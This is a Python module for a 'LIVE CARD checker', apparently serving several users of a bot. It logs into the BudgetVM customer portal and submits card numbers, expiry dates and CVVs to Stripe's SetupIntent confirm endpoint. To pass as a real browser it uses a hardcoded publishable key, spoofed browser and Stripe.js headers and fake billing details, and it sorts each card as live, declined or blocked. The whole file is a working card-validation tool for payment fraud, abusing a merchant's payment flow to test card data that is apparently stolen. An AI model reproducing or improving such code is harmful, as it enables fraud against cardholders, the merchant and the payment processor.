# -*- coding: utf-8 -*-
"""LIVE CARD checker — BudgetVM / Stripe SetupIntent flow."""
from __future__ import annotations

import asyncio
import logging
import os
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

import requests

log = logging.getLogger(__name__)

PORTAL_BASE = "https://portal.budgetvm.com"
LIVE_EMAIL = os.getenv("LIVE_LOGIN_EMAIL", "")
LIVE_PASSWORD = os.getenv("LIVE_LOGIN_PASSWORD", "")
STRIPE_PK = os.getenv("STRIPE_PK", "pk_live_7sv0O1D5LasgJtbYpxp9aUbX")
SESSION_MAX_RETRIES = max(5, min(30, int(os.getenv("SESSION_MAX_RETRIES", "15"))))
HTTP_WORKERS = max(10, min(80, int(os.getenv("HTTP_WORKERS", "80"))))

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
)

PORTAL_HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "DNT": "1",
    "Origin": PORTAL_BASE,
    "User-Agent": UA,
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

STRIPE_HEADERS = {
    "accept": "application/json",
    "accept-language": "ar,en-US;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": UA,
    "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

_executor: ThreadPoolExecutor | None = None
_registry_lock = threading.Lock()
_user_ctx: dict[int, "UserLiveCtx"] = {}
_user_async_locks: dict[int, asyncio.Lock] = {}


class UserLiveCtx:
    __slots__ = ("user_id", "http", "thread_lock", "valid", "failures", "portal_id")

    def __init__(self, user_id: int):
        self.user_id = user_id
        self.http: requests.Session | None = None
        self.thread_lock = threading.Lock()
        self.valid = False
        self.failures = 0
        self.portal_id = ""


def _get_executor() -> ThreadPoolExecutor:
    global _executor
    if _executor is None:
        _executor = ThreadPoolExecutor(max_workers=HTTP_WORKERS, thread_name_prefix="live")
    return _executor


async def run_blocking(fn, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(_get_executor(), fn, *args)


def _get_ctx(user_id: int) -> UserLiveCtx:
    with _registry_lock:
        if user_id not in _user_ctx:
            _user_ctx[user_id] = UserLiveCtx(user_id)
        return _user_ctx[user_id]


def _get_async_lock(user_id: int) -> asyncio.Lock:
    if user_id not in _user_async_locks:
        _user_async_locks[user_id] = asyncio.Lock()
    return _user_async_locks[user_id]


def _portal_headers(referer: str) -> dict:
    return {**PORTAL_HEADERS, "Referer": referer}


def _json_ok(resp: requests.Response) -> dict | None:
    try:
        return resp.json()
    except Exception:
        return None


def _create_setup_intent(session: requests.Session) -> str | None:
    resp = session.get(
        f"{PORTAL_BASE}/MyGateway/Stripe/createSetupIntent",
        headers=_portal_headers(f"{PORTAL_BASE}/MyAccount/MyBilling"),
        timeout=30,
    )
    data = _json_ok(resp)
    if not data or data.get("success") is not True:
        log.warning("createSetupIntent failed: %s", (data or resp.text)[:200])
        return None
    secret = (data.get("result") or {}).get("clientSecret")
    return secret or None


def _parse_seti_id(client_secret: str) -> str:
    if "_secret_" in client_secret:
        return client_secret.split("_secret_")[0]
    return client_secret


def _stripe_ids(session: requests.Session) -> tuple[str, str, str]:
    muid = session.cookies.get("__stripe_mid") or str(uuid.uuid4())
    sid = session.cookies.get("__stripe_sid") or str(uuid.uuid4())
    guid = str(uuid.uuid4())
    return muid, sid, guid


def _login_ctx(ctx: UserLiveCtx) -> bool:
    if not LIVE_EMAIL or not LIVE_PASSWORD:
        log.error("LIVE_LOGIN_EMAIL / LIVE_LOGIN_PASSWORD missing")
        return False

    with ctx.thread_lock:
        ctx.http = requests.Session()
        ctx.valid = False
        ctx.portal_id = ""

        try:
            login_resp = ctx.http.post(
                f"{PORTAL_BASE}/auth/login",
                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
                data={"email": LIVE_EMAIL, "password": LIVE_PASSWORD},
                timeout=30,
            )
            login_json = _json_ok(login_resp)
            if not login_json or login_json.get("success") is not True:
                log.error("user %s LIVE login JSON fail: %s", ctx.user_id, login_json)
                return False

            result = login_json.get("result") or {}
            portal_id = str(result.get("id") or "")
            unique = result.get("UniqueType") or "client"
            if not portal_id:
                log.error("user %s LIVE login — no portal id", ctx.user_id)
                return False

            if not ctx.http.cookies.get("ePortalv1"):
                log.error("user %s LIVE login — no ePortalv1 cookie", ctx.user_id)
                return False

            dnd_resp = ctx.http.post(
                f"{PORTAL_BASE}/auth/updateGoogleDND",
                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
                data={"dndstatus": "1", "gauthId": portal_id},
                timeout=30,
            )
            dnd_json = _json_ok(dnd_resp)
            if not dnd_json or dnd_json.get("success") is not True:
                log.error("user %s updateGoogleDND failed: %s", ctx.user_id, dnd_json)
                return False

            ask_resp = ctx.http.post(
                f"{PORTAL_BASE}/auth/googleAsk",
                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
                data={
                    "gEmail": LIVE_EMAIL,
                    "gUniqueask": unique,
                    "gIdask": portal_id,
                    "setup": "2",
                    "email": LIVE_EMAIL,
                    "gUnique": unique,
                    "gid": portal_id,
                },
                timeout=30,
            )
            ask_json = _json_ok(ask_resp)
            if not ask_json or ask_json.get("success") is not True:
                log.error("user %s googleAsk failed: %s", ctx.user_id, ask_json)
                return False

            ctx.http.get(
                f"{PORTAL_BASE}/MyAccount/MyBilling",
                headers=_portal_headers(f"{PORTAL_BASE}/"),
                timeout=30,
            )

            client_secret = _create_setup_intent(ctx.http)
            if not client_secret:
                log.error("user %s setup intent failed after login", ctx.user_id)
                return False

            ctx.portal_id = portal_id
            ctx.valid = True
            ctx.failures = 0
            log.info("user %s LIVE session OK — portal_id=%s", ctx.user_id, portal_id)
            return True

        except Exception as exc:
            log.exception("user %s LIVE login error: %s", ctx.user_id, exc)
            return False


def _validate_ctx(ctx: UserLiveCtx) -> bool:
    with ctx.thread_lock:
        if ctx.http is None or not ctx.http.cookies.get("ePortalv1"):
            ctx.valid = False
            return False
        secret = _create_setup_intent(ctx.http)
        if not secret:
            ctx.valid = False
            return False
        ctx.valid = True
        return True


def invalidate_user_session(user_id: int) -> None:
    ctx = _get_ctx(user_id)
    with ctx.thread_lock:
        ctx.valid = False
        ctx.http = None
        ctx.portal_id = ""
        ctx.failures += 1


def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
    parts = card.strip().split("|")
    if len(parts) != 4:
        return card, "ERROR"

    cc, mm, yy, cvv = parts
    yy2 = yy[-2:]
    session = ctx.http
    if not session:
        return card, "ERROR"

    client_secret = _create_setup_intent(session)
    if not client_secret:
        return card, "ERROR"

    seti_id = _parse_seti_id(client_secret)
    muid, sid, guid = _stripe_ids(session)
    session_id = str(uuid.uuid4())

    confirm_data = urlencode({
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][name]": "SAAD",
        "payment_method_data[billing_details][address][line1]": "111 North Street",
        "payment_method_data[billing_details][address][line2]": "",
        "payment_method_data[billing_details][address][city]": "Napoleon",
        "payment_method_data[billing_details][address][state]": "AK",
        "payment_method_data[billing_details][address][postal_code]": "49261-9011",
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy2,
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/5568634f16; stripe-js-v3/5568634f16; card-element",
        "payment_method_data[referrer]": PORTAL_BASE,
        "payment_method_data[time_on_page]": "29077",
        "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "card-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2017",
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": STRIPE_PK,
        "client_secret": client_secret,
        "client_attribution_metadata[client_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
    })

    confirm_resp = requests.post(
        f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
        headers=STRIPE_HEADERS,
        data=confirm_data,
        timeout=30,
    )

    data = _json_ok(confirm_resp)
    if not data:
        return card, "ERROR"

    if data.get("status") == "succeeded":
        return card, "LIVE"

    if data.get("object") == "setup_intent" and data.get("status") == "succeeded":
        return card, "LIVE"

    err = data.get("error") or {}
    if err:
        code = (err.get("code") or "").lower()
        msg = (err.get("message") or "").lower()
        decline = (err.get("decline_code") or "").lower()
        if code == "card_declined" or "declined" in msg or decline:
            return card, "DECLINE"
        if "does not support" in msg:
            return card, "BLOCKED"
        log.warning("Stripe error for %s: %s", ctx.user_id, err.get("code") or err.get("message"))
        return card, "ERROR"

    setup = data.get("setup_intent") or {}
    last_err = setup.get("last_setup_error") or {}
    if last_err:
        msg = (last_err.get("message") or "").lower()
        if "declined" in msg or last_err.get("code") == "card_declined":
            return card, "DECLINE"

    return card, "ERROR"


async def _ensure_unlocked(user_id: int, stats: dict) -> bool:
    for attempt in range(SESSION_MAX_RETRIES):
        if not stats.get("is_running", True):
            return False
        stats["last_response"] = f"session_retry:{attempt + 1}"
        ctx = _get_ctx(user_id)

        if await run_blocking(_validate_ctx, ctx):
            return True

        invalidate_user_session(user_id)
        if await run_blocking(_login_ctx, _get_ctx(user_id)):
            return True

        log.warning("user %s LIVE session retry %d/%d", user_id, attempt + 1, SESSION_MAX_RETRIES)
        await asyncio.sleep(1.0 + attempt * 0.4)

    return False


async def ensure_user_session(user_id: int, stats: dict) -> bool:
    async with _get_async_lock(user_id):
        return await _ensure_unlocked(user_id, stats)


async def check_card(card: str, user_id: int, stats: dict, check_seq: int) -> tuple[str, str]:
    if not stats.get("is_running") or stats.get("check_seq") != check_seq:
        return card, "STOPPED"

    async with _get_async_lock(user_id):
        ctx = _get_ctx(user_id)
        if not ctx.valid or not await run_blocking(_validate_ctx, ctx):
            invalidate_user_session(user_id)
            if not await _ensure_unlocked(user_id, stats):
                stats["last_response"] = "guid_error"
                return card, "ERROR"
            ctx = _get_ctx(user_id)

        result = await run_blocking(_check_card_sync, ctx, card)

        if result[1] == "ERROR":
            invalidate_user_session(user_id)

        return result
